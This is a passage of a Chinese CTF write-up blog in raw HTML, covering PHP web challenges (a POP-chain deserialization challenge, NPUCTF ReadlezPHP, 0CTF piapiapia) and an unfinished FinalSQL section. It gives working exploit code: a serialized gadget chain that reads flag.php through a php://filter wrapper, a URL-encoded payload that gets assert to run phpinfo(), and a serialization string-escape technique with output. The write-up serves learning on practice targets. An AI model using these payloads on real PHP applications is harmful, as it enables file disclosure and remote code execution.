class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Show;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>思路是这样  这里每个类的每个方法都有作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、Modifier::__invoke() 可以文件读写，要想触发就需要它被当做函数使用<br><span class="hljs-number">2</span>、继续上面，Test::__get() 这里可以触发函数 因此大致知道 Test-&gt;p = Modifier::__invoke()  这里的代码负责体现思路，不会很严谨<br><span class="hljs-number">3</span>、怎么触发这个__get() ？ 需要让他找不到或者找到的属性不能被访问 Show::__toString()提供了这个触发的思路 假设我给str一个实例化的Test类就会因为找不到source而使用Test::__get()<br>思路就是这样然后来构建exp<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>        <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;<br>    <br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;karsa&quot;</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    &#125;<br>    <br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Show(<span class="hljs-string">&#x27;1&#x27;</span>);<br>    <span class="hljs-variable">$a</span>-&gt;str = <span class="hljs-keyword">new</span> Test();<br>    <span class="hljs-variable">$a</span>-&gt;str-&gt;p = <span class="hljs-keyword">new</span> Modifier();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Show(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>));<br><span class="hljs-comment">//  Test::__get =&gt; Modifier::__invoke()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>注入点在search.php里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><p>没出来就</p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>首页源码中直接搜索php，得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-keyword">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-keyword">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> HelloPhp;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br></code></pre></td></tr></table></figure><p>有exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;phpinfo()&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> HelloPhp;<br><br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$c</span>)).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-comment">//O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A9%3A%22phpinfo%28%29%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</span><br></code></pre></td></tr></table></figure><p>传入在phpinfo中可得到flag</p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><strong>反序列化字符串逃逸</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/x/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;yy&#x27;</span>,<span class="hljs-variable">$string</span>);<br>    &#125;<br>    <br>    <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;xixi&#x27;</span>;<br>    <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;11111&#x27;</span>;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>    <span class="hljs-variable">$vv</span> = serialize(<span class="hljs-variable">$user</span>);<br>    var_dump(<span class="hljs-variable">$vv</span>);<br>    <span class="hljs-variable">$vv</span> = filter(<span class="hljs-variable">$vv</span>);<br>    var_dump(<span class="hljs-variable">$vv</span>);<br>    var_dump(unserialize(<span class="hljs-variable">$vv</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">string(37) &quot;a:2:&#123;i:0;s:4:&quot;xixi&quot;;i:1;s:5:&quot;11111&quot;;&#125;&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">string(39) &quot;a:2:&#123;i:0;s:4:&quot;yyiyyi&quot;;i:1;s:5:&quot;11111&quot;;&#125;&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">bool(false)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>可以看到这里对序列化的内容做了替换原本长度为4的部分现在长度为6，所以反序列化失败。</p><p>现在让我们控制$password的内容进行控制改为 admin 即 <code>&quot;;i:1;s:5:&quot;11111&quot;;&#125;</code> &#x3D;&gt; <code>&quot;;i:1;s:5:&quot;admin&quot;;&#125;</code></p><p>所以 <code>;i:1;s:5:&quot;admin&quot;;&#125;</code> 就是需要逃逸的字符串 长度19</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/x/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;yy&#x27;</span>,<span class="hljs-variable">$string</span>);<br>    &#125;<br>    <br>    <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;xxxxxxxxxxxxxxxxxxx&quot;;i:1;s:5:&quot;admin&quot;;&#125;&#x27;</span>;   <span class="hljs-comment">//19+19=38 所以前半部分长度为19</span><br>    <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;11111&#x27;</span>;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>    <span class="hljs-variable">$vv</span> = serialize(<span class="hljs-variable">$user</span>);<br>    var_dump(<span class="hljs-variable">$vv</span>);<br>    <span class="hljs-variable">$vv</span> = filter(<span class="hljs-variable">$vv</span>);<br>    var_dump(<span class="hljs-variable">$vv</span>);<br>    var_dump(unserialize(<span class="hljs-variable">$vv</span>));<br><span class="hljs-meta">?&gt;</span><br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment">string(72) &quot;a:2:&#123;i:0;s:38:&quot;xxxxxxxxxxxxxxxxxxx&quot;;i:1;s:5:&quot;admin&quot;;&#125;&quot;;i:1;s:5:&quot;11111&quot;;&#125;&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">string(91) &quot;a:2:&#123;i:0;s:38:&quot;yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:5:&quot;admin&quot;;&#125;&quot;;i:1;s:5:&quot;11111&quot;;&#125;&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">array(2) &#123;</span><br><span class="hljs-comment">  [0] =&gt;</span><br><span class="hljs-comment">  string(38) &quot;yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;</span><br><span class="hljs-comment">  [1] =&gt;</span><br><span class="hljs-comment">  string(5) &quot;admin&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">   */</span><br></code></pre></td></tr></table></figure><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>得知 PHP版本:5.6.40</p><p>访问 <code>/url/www.zip</code>获取源码</p><h4 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h4><p>profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$profile</span>=<span class="hljs-variable">$user</span>-&gt;show_profile(<span class="hljs-variable">$username</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$profile</span>  == <span class="hljs-literal">null</span>) &#123;<br>header(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$profile</span> = unserialize(<span class="hljs-variable">$profile</span>);<br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = base64_encode(file_get_contents(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>几个要点：</p><ul><li><p>12行存在反序列化操作</p></li><li><p>16行文件读取</p></li><li><p>profile经过了show_profile的处理</p></li></ul><p>跟进 class.php </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">mysql</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_exists</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$key_list</span> = <span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br><span class="hljs-variable">$value_list</span> = <span class="hljs-keyword">Array</span>(<span class="hljs-variable">$username</span>, md5(<span class="hljs-variable">$password</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::insert(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> &amp;&amp; <span class="hljs-variable">$object</span>-&gt;password === md5(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>-&gt;profile;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::update(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$link</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"><span class="hljs-variable">$config</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;link = mysql_connect(<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>],<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>);<br>mysql_select_db(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>]);<br>mysql_query(<span class="hljs-string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);    <span class="hljs-comment">//MySQL返回错误并忽视剩余的行</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;link;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$ret</span> = <span class="hljs-string">&#x27;*&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT <span class="hljs-subst">$ret</span> FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>, <span class="hljs-keyword">$this</span>-&gt;link);<br><span class="hljs-keyword">return</span> mysql_fetch_object(<span class="hljs-variable">$result</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span></span>) </span>&#123;<br><span class="hljs-variable">$key</span> = implode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$key_list</span>);<br><span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;\&#x27;&#x27;</span> . implode(<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="hljs-variable">$value_list</span>) . <span class="hljs-string">&#x27;\&#x27;&#x27;</span>; <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO <span class="hljs-subst">$table</span> (<span class="hljs-subst">$key</span>) VALUES (<span class="hljs-subst">$value</span>)&quot;</span>;<br><span class="hljs-keyword">return</span> mysql_query(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> mysql_query(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;  <span class="hljs-comment">//过滤 &#x27; \</span><br><span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;<br>&#125;<br>&#125;<br>session_start();<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> user();<br><span class="hljs-variable">$user</span>-&gt;connect(<span 